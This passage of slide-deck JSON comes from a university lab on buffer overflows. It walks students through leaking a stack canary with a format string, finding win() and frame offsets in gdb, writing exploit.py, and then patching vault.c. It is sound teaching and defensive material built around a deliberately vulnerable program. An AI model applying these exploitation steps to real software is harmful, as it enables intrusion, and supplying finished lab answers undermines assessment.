filler","position":{"left":681.6,"top":302.4,"width":192,"height":100.8},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","alignment":"center"}},{"kind":"textbox","text":"&win","position":{"left":873.6,"top":302.4,"width":220.8,"height":100.8},"style":{"fontSize":20,"typeface":"Arial","color":"#000000","bold":true,"alignment":"center"}},{"kind":"textbox","text":"keeps the canary intact → check passes → ret jumps to win()","position":{"left":105.6,"top":420.48,"width":988.8,"height":38.4},"style":{"fontSize":22.67,"typeface":"Arial","color":"#404040","alignment":"center"}},{"kind":"textbox","text":"check_request returns → canary matches → ret pops &win → win() prints LAB2-WIN:vault-xxxxxxxx.","position":{"left":67.2,"top":504,"width":1200,"height":499.2},"style":{"fontSize":25.33,"typeface":"Arial","color":"#000000","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"20","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}
{"index":18,"title":"Doing the Graded Lab","layout":{"id":"ly/ux4ruhcv","name":"BLANK"},"elements":[{"kind":"textbox","text":"Doing the Graded Lab","position":{"left":52.8,"top":26.88,"width":1171.2,"height":96},"style":{"fontSize":53.33,"typeface":"Arial","color":"#000000","alignment":"left"}},{"kind":"textbox","text":"# 1  generate YOUR instance and build it\npython3 make_vault.py <your-student-id>\nmake && make test\n \n# 2  find win()   (fixed address, because the build is -no-pie)\ngdb ./vault        (gdb) print &win\n \n# 3  find the canary's leak slot  (value ends in 00 and changes each run)\necho '%N$p' | ./vault            # sweep N until you spot the canary\n \n# 4  find the offsets in the live frame\n(gdb) break check_request ; run < tests/accept.bin ; x/16gx note\n \n# 5  fill WIN, LEAK_INDEX, OFF_CANARY, OFF_RETADDR + build_payload() in exploit.py\npython3 exploit.py               # -> LAB2-WIN:vault-xxxxxxxx\n \n# 6  fix BOTH bugs in vault.c; benign tests still pass; the exploit now fails","position":{"left":57.6,"top":144,"width":1180.8,"height":475.2},"style":{"fontSize":17.33,"typeface":"Consolas","color":"#1A1A1A","alignment":"left"}},{"kind":"textbox","text":"Submit: completed exploit.py, fixed vault.c, writeup.md.  The four values and the live canary are yours to find.","position":{"left":62.4,"top":645.12,"width":1180.8,"height":48},"style":{"fontSize":17.33,"typeface":"Arial","color":"#595959","bold":true,"alignment":"left"}},{"kind":"textbox","text":"CS 165 · Lab 2 · Buffer Overflow","position":{"left":52.8,"top":679.68,"width":576,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"left"}},{"kind":"textbox","text":"21","position":{"left":1219.2,"top":679.68,"width":48,"height":28.8},"style":{"fontSize":13.33,"typeface":"Arial","color":"#595959","alignment":"right"}}]}